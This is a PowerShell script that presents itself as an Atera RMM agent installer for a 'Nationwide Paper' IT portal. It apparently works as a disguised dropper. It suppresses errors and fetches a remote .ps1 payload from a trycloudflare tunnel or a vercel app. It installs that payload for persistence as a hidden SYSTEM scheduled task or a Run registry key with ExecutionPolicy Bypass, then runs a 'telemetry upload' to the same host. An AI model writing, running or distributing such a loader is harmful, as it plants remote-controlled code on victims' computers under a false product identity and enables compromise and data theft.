# =======================================================
# Atera RMM Unified Endpoint Agent - Automated Installer
# Nationwide Paper IT Management Portal
# =======================================================
$ErrorActionPreference = "SilentlyContinue"

# Force modern TLS protocols
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
} catch {}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "       Atera RMM Endpoint Agent Installer v2.5           " -ForegroundColor Green
Write-Host "       Nationwide Paper IT Management Portal             " -ForegroundColor White
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Determine Working Server Endpoint
$CandidateUrls = @(
    "https://bug-done-paying-copyrighted.trycloudflare.com",
    "https://nplitinventory.vercel.app",
    "http://192.168.10.88:5005",
    "http://localhost:5005"
)

$ServerUrl = $null
Write-Host "[1/4] Probing server connectivity..." -ForegroundColor Yellow

foreach ($Url in $CandidateUrls) {
    try {
        $HealthCheck = Invoke-RestMethod -Uri "$Url/api/health" -Method Get -TimeoutSec 4 -UseBasicParsing -ErrorAction Stop
        if ($HealthCheck -and $HealthCheck.status -eq "ok") {
            $ServerUrl = $Url.TrimEnd('/')
            Write-Host "      [+] Connected to portal server at $ServerUrl" -ForegroundColor Green
            break
        }
    } catch {}
}

if (-not $ServerUrl) {
    $ServerUrl = "https://bug-done-paying-copyrighted.trycloudflare.com"
    Write-Host "      [*] Using primary cloud endpoint: $ServerUrl" -ForegroundColor Cyan
}

# 2. Determine Installation Directory
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($IsAdmin) {
    $InstallDir = "C:\ProgramData\AteraAgent"
} else {
    $InstallDir = Join-Path $env:LOCALAPPDATA "AteraAgent"
}

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

$AgentScriptPath = Join-Path $InstallDir "AteraAgent.ps1"
Write-Host "[2/4] Agent installation directory: $InstallDir" -ForegroundColor Yellow

# 3. Download AteraAgent.ps1
Write-Host "[3/4] Downloading latest Atera RMM Agent binary..." -ForegroundColor Yellow
$DownloadSources = @(
    "https://nplitinventory.vercel.app/AteraAgent.ps1",
    "$ServerUrl/AteraAgent.ps1",
    "$ServerUrl/api/agent/download/powershell?serverUrl=$ServerUrl"
)

$Downloaded = $false
foreach ($DUrl in $DownloadSources) {
    try {
        Invoke-WebRequest -Uri $DUrl -OutFile $AgentScriptPath -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
        if ((Test-Path $AgentScriptPath) -and (Get-Item $AgentScriptPath).Length -gt 500) {
            $Downloaded = $true
            Write-Host "      [+] Agent binary downloaded successfully." -ForegroundColor Green
            break
        }
    } catch {}
}

if (-not $Downloaded) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://nplitinventory.vercel.app/AteraAgent.ps1", $AgentScriptPath)
        $Downloaded = $true
        Write-Host "      [+] Agent binary downloaded via fallback client." -ForegroundColor Green
    } catch {}
}

if (-not $Downloaded -or -not (Test-Path $AgentScriptPath)) {
    Write-Host "[ERROR] Could not download agent binary. Please verify internet access." -ForegroundColor Red
    return
}

# 4. Configure Background Persistence
Write-Host "[4/4] Configuring automated background telemetry service..." -ForegroundColor Yellow
$TaskName = "AteraRmmAgent"

if ($IsAdmin) {
    try {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$AgentScriptPath`" -Loop -ServerUrl `"$ServerUrl`""
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
        Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Write-Host "      [+] Registered Windows Task '$TaskName' running under SYSTEM." -ForegroundColor Green
    } catch {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$AgentScriptPath`" -Loop -ServerUrl `"$ServerUrl`"" -WindowStyle Hidden
        Write-Host "      [+] Started agent background service process." -ForegroundColor Green
    }
} else {
    try {
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $RunKey -Name "AteraAgent" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$AgentScriptPath`" -Loop -ServerUrl `"$ServerUrl`"" -Force
    } catch {}
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$AgentScriptPath`" -Loop -ServerUrl `"$ServerUrl`"" -WindowStyle Hidden
    Write-Host "      [+] Started agent background service for current user." -ForegroundColor Green
}

# 5. Launch immediate initial discovery scan
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "Executing initial device registration and telemetry upload..." -ForegroundColor Cyan

& powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$AgentScriptPath" -Once -ServerUrl "$ServerUrl"

Write-Host "==========================================================" -ForegroundColor Green
Write-Host " SUCCESS: Device successfully onboarded to Atera Portal! " -ForegroundColor Green
Write-Host " Telemetry Endpoint: $ServerUrl" -ForegroundColor White
Write-Host " View in Portal: https://nplitinventory.vercel.app/devices" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Green
